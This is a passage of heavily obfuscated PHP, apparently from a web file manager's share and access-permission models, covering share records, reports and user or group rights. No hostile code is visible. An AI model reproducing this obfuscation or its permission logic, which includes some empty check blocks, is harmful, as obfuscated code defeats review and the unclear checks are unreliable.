if ($¶¶Â…ƒ×[$Ø…±ÇÁß[539]] == $Ø…±ÇÁß[222] && $Ê–Şã¾ó[$Ø…±ÇÁß[539]] == $Ø…±ÇÁß[98]) { $öŒé™à¹ = $Ø…±ÇÁß[2036]; } if ($¶¶Â…ƒ×[$Ø…±ÇÁß[539]] == $Ø…±ÇÁß[98] && $Ê–Şã¾ó[$Ø…±ÇÁß[539]] == $Ø…±ÇÁß[222]) { $öŒé™à¹ = $Ø…±ÇÁß[2039]; } if ($¶¶Â…ƒ×[$Ø…±ÇÁß[640]] == $Ø…±ÇÁß[222] && $Ê–Şã¾ó[$Ø…±ÇÁß[640]] == $Ø…±ÇÁß[98]) { $öŒé™à¹ = $Ø…±ÇÁß[2037]; } if ($¶¶Â…ƒ×[$Ø…±ÇÁß[640]] == $Ø…±ÇÁß[98] && $Ê–Şã¾ó[$Ø…±ÇÁß[640]] == $Ø…±ÇÁß[222]) { $öŒé™à¹ = $Ø…±ÇÁß[2040]; } Model($Ø…±ÇÁß[610])->eventShare($ëçõ¹”°, $öŒé™à¹); return; } private function _addShareData($‚ÜÇıœ˜, $ãÚ‹©§› = array(), $µñã²¸Ù = false) { $àîö±Ì =& $_SERVER[ú÷îèÆÜ]; $•²è£ª = $µñã²¸Ù == $àîö±Ì[189] ? 0 : USER_ID; $ßÜíùˆ® = array($àîö±Ì[468] => $‚ÜÇıœ˜, $àîö±Ì[1676] => $•²è£ª); if ($‚ÜÇıœ˜ == 0) { $ßÜíùˆ® = array($àîö±Ì[2041] => $ãÚ‹©§›[$àîö±Ì[1216]], $àîö±Ì[1676] => $•²è£ª); } if ($”¸ô‚¡ä = $this->where($ßÜíùˆ®)->find()) { return $”¸ô‚¡ä[$àîö±Ì[642]]; } if ($‚ÜÇıœ˜ == 0) { $Ö…ğõ…Æ = array($àîö±Ì[42] => get_path_this($ãÚ‹©§›[$àîö±Ì[94]])); } else { $Ö…ğõ…Æ = Model($àîö±Ì[865])->sourceInfo($‚ÜÇıœ˜); if (!$Ö…ğõ…Æ) { return !1; } } if (!$ãÚ‹©§›[$àîö±Ì[1582]]) { $ãÚ‹©§›[$àîö±Ì[1582]] = $Ö…ğõ…Æ[$àîö±Ì[42]]; } $å’ûñ‹¡ = array($àîö±Ì[1676] => $•²è£ª, $àîö±Ì[468] => $‚ÜÇıœ˜, $àîö±Ì[1582] => $àîö±Ì[22], $àîö±Ì[539] => 0, $àîö±Ì[640] => 0, $àîö±Ì[1216] => $àîö±Ì[22], $àîö±Ì[360] => $àîö±Ì[22], $àîö±Ì[930] => $àîö±Ì[22], $àîö±Ì[2042] => 0, $àîö±Ì[2043] => 0, $àîö±Ì[801] => 0, $àîö±Ì[2044] => $àîö±Ì[22], $àîö±Ì[2025] => $àîö±Ì[22]); $ıÙï « = explode($àîö±Ì[60], $àîö±Ì[2045]); foreach ($ıÙï « as $Èº—İÒ–) { if (!isset($ãÚ‹©§›[$Èº—İÒ–])) { continue; } $å’ûñ‹¡[$Èº—İÒ–] = $ãÚ‹©§›[$Èº—İÒ–]; } $ø¯—ÓÃ× = $this->add($å’ûñ‹¡); $ˆèˆªİĞ = array($àîö±Ì[2025] => short_id($ø¯—ÓÃ×)); $this->where(array($àîö±Ì[2046] => $ø¯—ÓÃ×))->save($ˆèˆªİĞ); return $ø¯—ÓÃ×; } private function _shareAuthSet($Àğ¥Ø¿ƒ, $¡ìª×²æ) { $ºùÁêñ =& $_SERVER[ú÷îèÆÜ]; if (!is_array($¡ìª×²æ)) { return !1; } $øÚ˜Û’Œ = Model($ºùÁêñ[1991]); $øÚ˜Û’Œ->where(array($ºùÁêñ[642] => $Àğ¥Ø¿ƒ))->delete(); $«õºÅ»» = array(); foreach ($¡ìª×²æ as $õĞË¾“‡) { $ÉÆéÈ”¤ = SourceModel::TYPE_USER; if ($õĞË¾“‡[$ºùÁêñ[188]] == SourceModel::TYPE_GROUP) { $ÉÆéÈ”¤ = SourceModel::TYPE_GROUP; } $·ˆ×†š = array($ºùÁêñ[642] => $Àğ¥Ø¿ƒ, $ºùÁêñ[188] => $ÉÆéÈ”¤, $ºùÁêñ[547] => intval($õĞË¾“‡[$ºùÁêñ[547]]), $ºùÁêñ[1987] => 0, $ºùÁêñ[2047] => -1); if ($õĞË¾“‡[$ºùÁêñ[1987]]) { $·ˆ×†š[$ºùÁêñ[1987]] = $õĞË¾“‡[$ºùÁêñ[1987]]; } else { if ($õĞË¾“‡[$ºùÁêñ[2047]]) { $·ˆ×†š[$ºùÁêñ[2047]] = $õĞË¾“‡[$ºùÁêñ[2047]]; } } $«õºÅ»»[] = $·ˆ×†š; } return $øÚ˜Û’Œ->addAll($«õºÅ»», array(), !0); } public function numViewAdd($ö‹ÀÕĞî) { $ñ¾¤ıÈ =& $_SERVER[ú÷îèÆÜ]; $ÒüÌŒÂ = array($ñ¾¤ıÈ[2046] => $ö‹ÀÕĞî); $this->where($ÒüÌŒÂ)->setAdd($ñ¾¤ıÈ[2042]); } public function numDownloadAdd($ºõµÏÁÊ) { $…ñçÒ‘Ä =& $_SERVER[ú÷îèÆÜ]; $ÒÅÔÂ×¦ = array($…ñçÒ‘Ä[2046] => $ºõµÏÁÊ); $this->where($ÒÅÔÂ×¦)->setAdd($…ñçÒ‘Ä[2043]); } protected function shareEdit($ç‹µùÔ, $ƒÂï—ñİ) { $£ÄÊÌ‘˜ =& $_SERVER[ú÷îèÆÜ]; $ùàÇÜŞ = $this->getInfo($ç‹µùÔ); if (!$ùàÇÜŞ) { return !1; } $this->_checkLinkShare($ƒÂï—ñİ, $ùàÇÜŞ); $·¨ÃéáÂ = array(); $Ù»£õùÃ = explode($£ÄÊÌ‘˜[60], $£ÄÊÌ‘˜[2048]); foreach ($Ù»£õùÃ as $ñ²­ò’“) { if (!array_key_exists($ñ²­ò’“, $ƒÂï—ñİ)) { continue; } $·¨ÃéáÂ[$ñ²­ò’“] = $ƒÂï—ñİ[$ñ²­ò’“]; } $this->shareEventAdd($ùàÇÜŞ[$£ÄÊÌ‘˜[191]], $ƒÂï—ñİ, $£ÄÊÌ‘˜[1853]); $this->where(array($£ÄÊÌ‘˜[2046] => $ç‹µùÔ))->save($·¨ÃéáÂ); if (isset($ƒÂï—ñİ[$£ÄÊÌ‘˜[2034]])) { $this->_shareAuthSet($ç‹µùÔ, $ƒÂï—ñİ[$£ÄÊÌ‘˜[2034]]); } return !0; } private function _checkLinkShare($¬ªë©ş¯, $³§£Ÿ’Õ) { $ÔÔüüØÛ =& $_SERVER[ú÷îèÆÜ]; if ($¬ªë©ş¯[$ÔÔüüØÛ[539]] != $ÔÔüüØÛ[98]) { return; } $èÖ°Êßï = $³§£Ÿ’Õ[$ÔÔüüØÛ[97]][$ÔÔüüØÛ[191]]; if ($³§£Ÿ’Õ[$ÔÔüüØÛ[97]][$ÔÔüüØÛ[43]] != $ÔÔüüØÛ[224]) { $“”Ôô‰« = $this->_folderReport($èÖ°Êßï); if (!$“”Ôô‰«) { return; } show_json(LNG($ÔÔüüØÛ[2049]) . $ÔÔüüØÛ[2050] . $“”Ôô‰«, !1); } $ËÙüïÕÂ = Model($ÔÔüüØÛ[865])->fileInfoGet($³§£Ÿ’Õ[$ÔÔüüØÛ[97]][$ÔÔüüØÛ[191]]); if (!$ËÙüïÕÂ) { return; } $·òË™†„ = $this->shareFileMeta($ËÙüïÕÂ[$ÔÔüüØÛ[518]]); if (isset($·òË™†„[$ÔÔüüØÛ[427]]) && $·òË™†„[$ÔÔüüØÛ[427]] == $ÔÔüüØÛ[98]) { show_json(LNG($ÔÔüüØÛ[2051]), !1); } } private function _folderReport($ªÅÄ“É´) { $ğÙÛÏÚÆ =& $_SERVER[ú÷îèÆÜ]; $ÃŠÚ½àı = array($ğÙÛÏÚÆ[518] => array($ğÙÛÏÚÆ[1053], 0), $ğÙÛÏÚÆ[790] => 3); $´ÎôÅç÷ = Model($ğÙÛÏÚÆ[2052])->where($ÃŠÚ½àı)->field($ğÙÛÏÚÆ[518])->select(); if (!$´ÎôÅç÷) { return !1; } $´ÎôÅç÷ = array_to_keyvalue($´ÎôÅç÷, $ğÙÛÏÚÆ[22], $ğÙÛÏÚÆ[518]); $ıûöõÌ = $ğÙÛÏÚÆ[60] . $ªÅÄ“É´ . $ğÙÛÏÚÆ[60]; $ÃŠÚ½àı = array($ğÙÛÏÚÆ[518] => array($ğÙÛÏÚÆ[17], $´ÎôÅç÷), $ğÙÛÏÚÆ[562] => array($ğÙÛÏÚÆ[436], "\x25{$ıûöõÌ}\x25"), $ğÙÛÏÚÆ[482] => 0); $Ö³©ıá‹ = Model($ğÙÛÏÚÆ[865])->where($ÃŠÚ½àı)->field($ğÙÛÏÚÆ[2053])->find(); if (!$Ö³©ıá‹) { return !1; } $¼¿‹¨î¬ = substr($Ö³©ıá‹[$ğÙÛÏÚÆ[562]], strpos($Ö³©ıá‹[$ğÙÛÏÚÆ[562]], $ıûöõÌ)); $ÃŠÚ½àı = array($ğÙÛÏÚÆ[191] => array($ğÙÛÏÚÆ[17], trim($¼¿‹¨î¬, $ğÙÛÏÚÆ[60]))); $‰Ô‘“š¢ = Model($ğÙÛÏÚÆ[865])->where($ÃŠÚ½àı)->field($ğÙÛÏÚÆ[42])->select(); $üÊúÙ” = array_to_keyvalue($‰Ô‘“š¢, $ğÙÛÏÚÆ[22], $ğÙÛÏÚÆ[42]); $üÊúÙ”[] = $Ö³©ıá‹[$ğÙÛÏÚÆ[42]]; return implode($ğÙÛÏÚÆ[18], $üÊúÙ”); } protected function remove($ÁÄ¸ÂÚ¯) { $«ò¡í§¶ =& $_SERVER[ú÷îèÆÜ]; if (is_array($ÁÄ¸ÂÚ¯)) { $ÁÄ¸ÂÚ¯ = array($«ò¡í§¶[17], $ÁÄ¸ÂÚ¯); } $ıÜø­ªà = array($«ò¡í§¶[642] => $ÁÄ¸ÂÚ¯); $çµùª…œ = $this->where($ıÜø­ªà)->delete(); if ($çµùª…œ) { Model($«ò¡í§¶[643])->where(array($«ò¡í§¶[642] => $ÁÄ¸ÂÚ¯))->delete(); } $Æ¿…·¢ø = is_array($ÁÄ¸ÂÚ¯) ? $ÁÄ¸ÂÚ¯[1] : array($ÁÄ¸ÂÚ¯); for ($ÔÊĞáÃé = 0; $ÔÊĞáÃé < count($Æ¿…·¢ø); $ÔÊĞáÃé++) { $Âá—„ = $this->getInfo($Æ¿…·¢ø[$ÔÊĞáÃé]); if ($Âá—„[$«ò¡í§¶[640]] == $«ò¡í§¶[98]) { Model($«ò¡í§¶[610])->eventShare($Âá—„[$«ò¡í§¶[191]], $«ò¡í§¶[2040]); } if ($Âá—„[$«ò¡í§¶[539]] == $«ò¡í§¶[98]) { Model($«ò¡í§¶[610])->eventShare($Âá—„[$«ò¡í§¶[191]], $«ò¡í§¶[2039]); } } return $çµùª…œ; } protected function removeBySource($Å´ãÛÃ§) { $®Ø“¶Ë =& $_SERVER[ú÷îèÆÜ]; $åÛøÔ™§ = array($®Ø“¶Ë[468] => array($®Ø“¶Ë[469], $Å´ãÛÃ§)); $©¢°©©Ô = $this->field($®Ø“¶Ë[642])->where($åÛøÔ™§)->select(); $©¢°©©Ô = array_to_keyvalue($©¢°©©Ô, $®Ø“¶Ë[22], $®Ø“¶Ë[642]); if (!$©¢°©©Ô) { return; } $åÛøÔ™§ = array($®Ø“¶Ë[2046] => array($®Ø“¶Ë[469], $©¢°©©Ô)); $this->where($åÛøÔ™§)->delete(); Model($®Ø“¶Ë[643])->where($åÛøÔ™§)->delete(); } public function listAll($€ë²§ĞÁ) { $ëĞ²ç’â =& $_SERVER[ú÷îèÆÜ]; $–çèşŠ = array(); if ($€ë²§ĞÁ[$ëĞ²ç’â[1685]]) { $–çèşŠ[$ëĞ²ç’â[1685]] = $€ë²§ĞÁ[$ëĞ²ç’â[1685]]; } if ($€ë²§ĞÁ[$ëĞ²ç’â[800]]) { $Ôª®‰¸Û = $€ë²§ĞÁ[$ëĞ²ç’â[801]] ? $€ë²§ĞÁ[$ëĞ²ç’â[801]] : strtotime(date($ëĞ²ç’â[2054])); $–çèşŠ[$ëĞ²ç’â[225]] = array($ëĞ²ç’â[386], array($€ë²§ĞÁ[$ëĞ²ç’â[800]], $Ôª®‰¸Û)); } if ($€ë²§ĞÁ[$ëĞ²ç’â[43]]) { $–çèşŠ[$€ë²§ĞÁ[$ëĞ²ç’â[43]]] = 1; } else { $–çèşŠ[] = array($ëĞ²ç’â[539] => array($ëĞ²ç’â[1053], 0), $ëĞ²ç’â[640] => array($ëĞ²ç’â[1053], 0), $ëĞ²ç’â[2028] => $ëĞ²ç’â[1981]); } if ($€ë²§ĞÁ[$ëĞ²ç’â[1977]]) { $–çèşŠ[] = array($ëĞ²ç’â[2025] => $€ë²§ĞÁ[$ëĞ²ç’â[1977]], $ëĞ²ç’â[1582] => array($ëĞ²ç’â[436], "\45{$€ë²§ĞÁ[$ëĞ²ç’â[1977]]}\x25"), $ëĞ²ç’â[2028] => $ëĞ²ç’â[1981]); } $´Í²·í¹ = $this->_makeOrder()->where($–çèşŠ)->selectPage(20); if (empty($´Í²·í¹[$ëĞ²ç’â[422]])) { return array(); } $this->_listDataApply($´Í²·í¹[$ëĞ²ç’â[422]]); return $´Í²·í¹; } public function listDataApply($Éñú¦ÄÕ) { $this->_listDataApply($Éñú¦ÄÕ); return $Éñú¦ÄÕ; } private function _listDataApply(&$ŠÍêÓ®) { $õò®ú¿ğ =& $_SERVER[ú÷îèÆÜ]; $‚÷Ú¨û = array_to_keyvalue($ŠÍêÓ®, $õò®ú¿ğ[22], $õò®ú¿ğ[1685]); $ı¿÷ÜóÅ = Model($õò®ú¿ğ[576])->userListInfo(array_unique($‚÷Ú¨û)); $ì²£·ò = array_to_keyvalue($ŠÍêÓ®, $õò®ú¿ğ[22], $õò®ú¿ğ[191]); $ª»©×ÅÏ = Model($õò®ú¿ğ[865])->sourceListInfo($ì²£·ò, !0); foreach ($ŠÍêÓ® as $Û£µ€¶Ë => &$òËºÙË‰) { $Œâ‡¨ñ = $òËºÙË‰[$õò®ú¿ğ[1685]]; $òËºÙË‰[$õò®ú¿ğ[2055]] = $ı¿÷ÜóÅ[$Œâ‡¨ñ] ? $ı¿÷ÜóÅ[$Œâ‡¨ñ] : !1; $§­ñòıÑ = $òËºÙË‰[$õò®ú¿ğ[191]]; $òËºÙË‰[$õò®ú¿ğ[97]] = $ª»©×ÅÏ[$§­ñòıÑ] ? $ª»©×ÅÏ[$§­ñòıÑ] : !1; if ($òËºÙË‰[$õò®ú¿ğ[97]][$õò®ú¿ğ[482]] == $õò®ú¿ğ[98]) { unset($ŠÍêÓ®[$Û£µ€¶Ë]); } if ($òËºÙË‰[$õò®ú¿ğ[97]] != $õò®ú¿ğ[222] && !$òËºÙË‰[$õò®ú¿ğ[97]]) { unset($ŠÍêÓ®[$Û£µ€¶Ë]); } } unset($òËºÙË‰); $ŠÍêÓ® = array_values($ŠÍêÓ®); } private function _makeOrder($ïş“àÁ = '') { $Ï¤İÍ¸ =& $_SERVER[ú÷îèÆÜ]; $´Ï×¼ï = array($Ï¤İÍ¸[225], $Ï¤İÍ¸[801], $Ï¤İÍ¸[2042], $Ï¤İÍ¸[2043]); $‚¿±ÈÛÊ = array($Ï¤İÍ¸[500] => $Ï¤İÍ¸[501], $Ï¤İÍ¸[502] => $Ï¤İÍ¸[503]); $¦€¿Ğş¶ = Input::get($Ï¤İÍ¸[507], $Ï¤İÍ¸[17], $Ï¤İÍ¸[474], $´Ï×¼ï); $‚Ïìõ£ï = Input::get($Ï¤İÍ¸[508], $Ï¤İÍ¸[17], $Ï¤İÍ¸[2056], array($Ï¤İÍ¸[1974], $Ï¤İÍ¸[502])); $‚Ïìõ£ï = $‚¿±ÈÛÊ[$‚Ïìõ£ï]; $ïş“àÁ = $ïş“àÁ . "{$¦€¿Ğş¶}\x20{$‚Ïìõ£ï}"; return $this->order($ïş“àÁ); } public function reportAdd($Û¡êÖñè) { $åŞ¾à¬ƒ =& $_SERVER[ú÷îèÆÜ]; $¶±Ş“öå = array($åŞ¾à¬ƒ[642] => $Û¡êÖñè[$åŞ¾à¬ƒ[642]], $åŞ¾à¬ƒ[1685] => USER_ID); if (Model($åŞ¾à¬ƒ[2052])->where($¶±Ş“öå)->find()) { return !1; } $ÛîŠŠ¼ñ = array($åŞ¾à¬ƒ[642] => $Û¡êÖñè[$åŞ¾à¬ƒ[642]], $åŞ¾à¬ƒ[1582] => $Û¡êÖñè[$åŞ¾à¬ƒ[1582]], $åŞ¾à¬ƒ[191] => $Û¡êÖñè[$åŞ¾à¬ƒ[191]], $åŞ¾à¬ƒ[518] => $Û¡êÖñè[$åŞ¾à¬ƒ[518]], $åŞ¾à¬ƒ[1685] => USER_ID, $åŞ¾à¬ƒ[43] => $Û¡êÖñè[$åŞ¾à¬ƒ[43]], $åŞ¾à¬ƒ[503] => $Û¡êÖñè[$åŞ¾à¬ƒ[503]]); return Model($åŞ¾à¬ƒ[2052])->add($ÛîŠŠ¼ñ); } public function reportList($×ëëÌ¶») { $äèÕ˜Ôµ =& $_SERVER[ú÷îèÆÜ]; $Åªé¯¯¢ = array(); if ($×ëëÌ¶»[$äèÕ˜Ôµ[800]]) { $´ÀìãÊ‹ = $×ëëÌ¶»[$äèÕ˜Ôµ[801]] ? $×ëëÌ¶»[$äèÕ˜Ôµ[801]] : strtotime(date($äèÕ˜Ôµ[2054])); $Åªé¯¯¢[$äèÕ˜Ôµ[225]] = array($äèÕ˜Ôµ[386], array($×ëëÌ¶»[$äèÕ˜Ôµ[800]], $´ÀìãÊ‹)); } if (isset($×ëëÌ¶»[$äèÕ˜Ôµ[43]]) && in_array($×ëëÌ¶»[$äèÕ˜Ôµ[43]], array($äèÕ˜Ôµ[98], $äèÕ˜Ôµ[487], $äèÕ˜Ôµ[2057], $äèÕ˜Ôµ[2058], $äèÕ˜Ôµ[2059]))) { $Åªé¯¯¢[$äèÕ˜Ôµ[43]] = $×ëëÌ¶»[$äèÕ˜Ôµ[43]]; } if (isset($×ëëÌ¶»[$äèÕ˜Ôµ[790]]) && in_array($×ëëÌ¶»[$äèÕ˜Ôµ[790]], array($äèÕ˜Ôµ[222], $äèÕ˜Ôµ[98], $äèÕ˜Ôµ[487], $äèÕ˜Ôµ[2057]))) { $Åªé¯¯¢[$äèÕ˜Ôµ[790]] = $×ëëÌ¶»[$äèÕ˜Ôµ[790]]; } $ÌˆŒ‘ë = Input::get($äèÕ˜Ôµ[508], $äèÕ˜Ôµ[17], $äèÕ˜Ôµ[2056], array($äèÕ˜Ôµ[1974], $äèÕ˜Ôµ[502])); $²šÖæ© = array($äèÕ˜Ôµ[500] => $äèÕ˜Ôµ[501], $äèÕ˜Ôµ[502] => $äèÕ˜Ôµ[503]); $¡óúõ¹¥ = $äèÕ˜Ôµ[2060] . $²šÖæ©[$ÌˆŒ‘ë]; $â€ä¾Ñ = Model($äèÕ˜Ôµ[2052])->where($Åªé¯¯¢)->order($¡óúõ¹¥)->selectPage(20); if (empty($â€ä¾Ñ[$äèÕ˜Ôµ[422]])) { return array(); } $Ş€µâ… = array_to_keyvalue_group($â€ä¾Ñ[$äèÕ˜Ôµ[422]], $äèÕ˜Ôµ[790], $äèÕ˜Ôµ[642]); if (!empty($Ş€µâ…[0])) { $×ëëÌ¶» = $Ş€µâ…[0]; $Åªé¯¯¢ = array($äèÕ˜Ôµ[642] => array($äèÕ˜Ôµ[17], $×ëëÌ¶»)); $ĞÂ¶Ó˜ñ = $this->where($Åªé¯¯¢)->field($äèÕ˜Ôµ[642])->select(); $ĞÂ¶Ó˜ñ = array_to_keyvalue($ĞÂ¶Ó˜ñ, $äèÕ˜Ôµ[22], $äèÕ˜Ôµ[642]); $şïõ…‡ò = array_diff($×ëëÌ¶», $ĞÂ¶Ó˜ñ); if (!empty($şïõ…‡ò)) { foreach ($â€ä¾Ñ[$äèÕ˜Ôµ[422]] as $Í¥ÃÇµ => $«ßÅ—É) { if (in_array($«ßÅ—É[$äèÕ˜Ôµ[642]], $şïõ…‡ò)) { unset($â€ä¾Ñ[$äèÕ˜Ôµ[422]][$Í¥ÃÇµ]); } } } } $this->_listDataApply($â€ä¾Ñ[$äèÕ˜Ôµ[422]]); return $â€ä¾Ñ; } public function reportStatus($Õ¯Ÿ ») { $Øö˜ş¹É =& $_SERVER[ú÷îèÆÜ]; $—ò®òµ = array($Øö˜ş¹É[452] => $Õ¯Ÿ »[$Øö˜ş¹É[452]]); $«ÊåÌä = Model($Øö˜ş¹É[2052])->where($—ò®òµ)->field($Øö˜ş¹É[2061])->find(); if (!$«ÊåÌä) { return !1; } $£ıæ¶¾Œ = array($Øö˜ş¹É[790] => $Õ¯Ÿ »[$Øö˜ş¹É[790]]); if ($Õ¯Ÿ »[$Øö˜ş¹É[790]] == $Øö˜ş¹É[2057] && $«ÊåÌä[$Øö˜ş¹É[790]] == $Øö˜ş¹É[2057]) { $£ıæ¶¾Œ[$Øö˜ş¹É[790]] = 0; } $¬¡Ã½¦à = Model($Øö˜ş¹É[2052])->where($—ò®òµ)->save($£ıæ¶¾Œ); if ($Õ¯Ÿ »[$Øö˜ş¹É[790]] == $Øö˜ş¹É[487]) { if ($«ÊåÌä[$Øö˜ş¹É[518]] != $Øö˜ş¹É[222] && $this->shareFileMeta($«ÊåÌä[$Øö˜ş¹É[518]])) { $this->shareFileMeta($«ÊåÌä[$Øö˜ş¹É[518]], 0); } $this->remove($«ÊåÌä[$Øö˜ş¹É[642]]); return !0; } if ($¬¡Ã½¦à && $Õ¯Ÿ »[$Øö˜ş¹É[790]] == $Øö˜ş¹É[2057]) { $“µó‰ş™ = $£ıæ¶¾Œ[$Øö˜ş¹É[790]] == $Øö˜ş¹É[2057] ? 1 : 0; $this->shareFileMeta($«ÊåÌä[$Øö˜ş¹É[518]], $“µó‰ş™); $this->removeByFile($«ÊåÌä[$Øö˜ş¹É[518]]); } return $¬¡Ã½¦à; } private function removeByFile($üÌ¾–ç) { $½Ñƒ¬è· =& $_SERVER[ú÷îèÆÜ]; $å½¨ÀÜé = Model($½Ñƒ¬è·[865])->where(array($½Ñƒ¬è·[518] => $üÌ¾–ç))->field($½Ñƒ¬è·[191])->select(); $ô–‹ñ´Ğ = array_to_keyvalue($å½¨ÀÜé, $½Ñƒ¬è·[22], $½Ñƒ¬è·[191]); $æÎ’”‡ = array($½Ñƒ¬è·[191] => array($½Ñƒ¬è·[17], $ô–‹ñ´Ğ), $½Ñƒ¬è·[539] => 1); $å½¨ÀÜé = $this->where($æÎ’”‡)->field($½Ñƒ¬è·[642])->select(); if (empty($å½¨ÀÜé)) { return; } $¤î§„¸ = array_to_keyvalue($å½¨ÀÜé, $½Ñƒ¬è·[22], $½Ñƒ¬è·[642]); $this->remove($¤î§„¸); } private function shareFileMeta($èœî°×ó, $êíØ¾î = null) { $¼˜İ¶Ë =& $_SERVER[ú÷îèÆÜ]; $º¸—„ÌÊ = array($¼˜İ¶Ë[518] => $èœî°×ó, $¼˜İ¶Ë[104] => $¼˜İ¶Ë[2062]); if (is_null($êíØ¾î)) { return Model($¼˜İ¶Ë[2063])->where($º¸—„ÌÊ)->find(); } $º¸—„ÌÊ[$¼˜İ¶Ë[427]] = $êíØ¾î; Model($¼˜İ¶Ë[2063])->add($º¸—„ÌÊ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\x65\x5f\x61\165\164\x68"; public function getAuth($²ğˆŒ‰Ü) { $ª¡È¼æ =& $_SERVER[ú÷îèÆÜ]; $ÜÏ¯šõË = $this->sourceAuthSelect($²ğˆŒ‰Ü); $‡—¹˜àÛ = array(); $¸’Ù•³ï = array(); $©Æú—Ôå = 2 << 25; foreach ($ÜÏ¯šõË as $§äÊßÖÄ) { $Ü¶ø³à = Model($ª¡È¼æ[549])->listData($§äÊßÖÄ[$ª¡È¼æ[1987]]); if (!$Ü¶ø³à) { continue; } $‡—¹˜àÛ[] = $§äÊßÖÄ; $µÔ•šÕè = 0; if ($§äÊßÖÄ[$ª¡È¼æ[188]] == SourceModel::TYPE_GROUP) { $µÔ•šÕè = $©Æú—Ôå * 2; } if ($§äÊßÖÄ[$ª¡È¼æ[188]] == SourceModel::TYPE_USER) { $µÔ•šÕè = $©Æú—Ôå; } if ($§äÊßÖÄ[$ª¡È¼æ[188]] == SourceModel::TYPE_USER && $§äÊßÖÄ[$ª¡È¼æ[547]] == $ª¡È¼æ[222]) { $µÔ•šÕè = 0; } $¸’Ù•³ï[] = $Ü¶ø³à[$ª¡È¼æ[464]] + $µÔ•šÕè; } array_multisort($¸’Ù•³ï, SORT_DESC, $‡—¹˜àÛ); return $‡—¹˜àÛ; } public function sourceAuthSelect($êÌá©íâ) { $à˜¸¨ë§ =& $_SERVER[ú÷îèÆÜ]; static $÷ù¹Ñ´¦ = array(); $¦ù—šã¿ = is_array($êÌá©íâ) ? !1 : !0; if ($¦ù—šã¿) { $êÌá©íâ = array($êÌá©íâ); } $ö‰­±ÀÖ = array(); foreach ($êÌá©íâ as $û×Ó²æ©) { if (isset($÷ù¹Ñ´¦[$û×Ó²æ©])) { $ö‰­±ÀÖ[$û×Ó²æ©] = $÷ù¹Ñ´¦[$û×Ó²æ©]; } } if (count($ö‰­±ÀÖ) == count($êÌá©íâ)) { return $¦ù—šã¿ ? $ö‰­±ÀÖ[$êÌá©íâ[0]] : $ö‰­±ÀÖ; } $ªÂşôï³ = $à˜¸¨ë§[2064]; $º˜—ğİ¤ = array($à˜¸¨ë§[191] => array($à˜¸¨ë§[17], $êÌá©íâ)); $Ì Ò¢ = $this->field($ªÂşôï³)->order($à˜¸¨ë§[452])->where($º˜—ğİ¤)->select(); $Ä£øšÆÇ = array_to_keyvalue_group($Ì Ò¢, $à˜¸¨ë§[191]); foreach ($êÌá©íâ as $û×Ó²æ©) { $÷ù¹Ñ´¦[$û×Ó²æ©] = $Ä£øšÆÇ[$û×Ó²æ©] ? $Ä£øšÆÇ[$û×Ó²æ©] : array(); } if ($¦ù—šã¿) { return $Ì Ò¢; } return $Ä£øšÆÇ; } public function setAuth($¸÷¡äÃ§, $ë²È¿§í) { $‘“ËÒÂ =& $_SERVER[ú÷îèÆÜ]; $×“Îíü = Model($‘“ËÒÂ[1373])->sourceInfo($¸÷¡äÃ§); if (!$×“Îíü) { return !1; } if ($×“Îíü[$‘“ËÒÂ[188]] != SourceModel::TYPE_GROUP) { return !1; } $œôÑ…§® = 1; $¹ÖûÄµÖ = $×“Îíü[$‘“ËÒÂ[547]]; if ($¹ÖûÄµÖ != $œôÑ…§®) { $Ü°£õÈ = array($‘“ËÒÂ[1883] => $¹ÖûÄµÖ); $ÉÛŠ‰ = Model($‘“ËÒÂ[1973])->field($‘“ËÒÂ[1685])->where($Ü°£õÈ)->select(); $ÉÛŠ‰ = array_to_keyvalue($ÉÛŠ‰, $‘“ËÒÂ[22], $‘“ËÒÂ[1685]); } $ô´ı”ÑÏ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ù¤ÁÑÃä = array(); foreach ($ë²È¿§í as $Úè”¿Ö) { if (!in_array($Úè”¿Ö[$‘“ËÒÂ[188]], $ô´ı”ÑÏ)) { show_json(LNG($‘“ËÒÂ[2065]), !1); } if ($¹ÖûÄµÖ != $œôÑ…§®) { if ($Úè”¿Ö[$‘“ËÒÂ[188]] == SourceModel::TYPE_GROUP) { } if ($Úè”¿Ö[$‘“ËÒÂ[547]] != 0 && !in_array($Úè”¿Ö[$‘“ËÒÂ[547]], $ÉÛŠ‰)) { } } if ($Úè”¿Ö[$‘“ËÒÂ[547]] == 0) { $Úè”¿Ö[$‘“ËÒÂ[188]] = SourceModel::TYPE_USER; } $Ù¤ÁÑÃä[] = array($‘“ËÒÂ[191] => $¸÷¡äÃ§, $‘“ËÒÂ[188] => intval($Úè”¿Ö[$‘“ËÒÂ[188]]), $‘“ËÒÂ[547] => intval($Úè”¿Ö[$‘“ËÒÂ[547]]), $‘“ËÒÂ[1987] => intval($Úè”¿Ö[$‘“ËÒÂ[1987]]) ? intval($Úè”¿Ö[$‘“ËÒÂ[1987]]) : 0, $‘“ËÒÂ[2047] => intval($Úè”¿Ö[$‘“ËÒÂ[2047]]) ? intval($Úè”¿Ö[$‘“ËÒÂ[2047]]) : -1); } $this->where(array($‘“ËÒÂ[468] => $¸÷¡äÃ§))->delete(); $this->addAll($Ù¤ÁÑÃä); return !0; } public function authClear($¥ôö¸êÂ) { $§½©Ÿç‰ =& $_SERVER[ú÷îèÆÜ]; $æÕ§†®Ü = Model($§½©Ÿç‰[1373])->sourceInfo($¥ôö¸êÂ); $©§šš£÷ = array($¥ôö¸êÂ); if ($æÕ§†®Ü[$§½©Ÿç‰[462]] == $§½©Ÿç‰[98]) { $›ïÁª ë = array($§½©Ÿç‰[629] => array($§½©Ÿç‰[589], $æÕ§†®Ü[$§½©Ÿç‰[562]] . $¥ôö¸êÂ . $§½©Ÿç‰[590])); $©§šš£÷ = Model($§½©Ÿç‰[1373])->field($§½©Ÿç‰[468])->where($›ïÁª ë)->getField($§½©Ÿç‰[191], !0); $©§šš£÷[] = $¥ôö¸êÂ; } $this->where(array($§½©Ÿç‰[468] => array($§½©Ÿç‰[469], $©§šš£÷)))->delete(); return !0; } public function getAllChildren($ÇÜé©•Ø) { $óª¯·ÅÄ =& $_SERVER[ú÷îèÆÜ]; $îëÖêŒë = Model($óª¯·ÅÄ[1373])->sourceInfo($ÇÜé©•Ø); if ($îëÖêŒë[$óª¯·ÅÄ[462]] != $óª¯·ÅÄ[98]) { return $this->sourceListAuth(array($ÇÜé©•Ø)); } if ($îëÖêŒë[$óª¯·ÅÄ[188]] != SourceModel::TYPE_GROUP) { return array(); } $º°•„è† 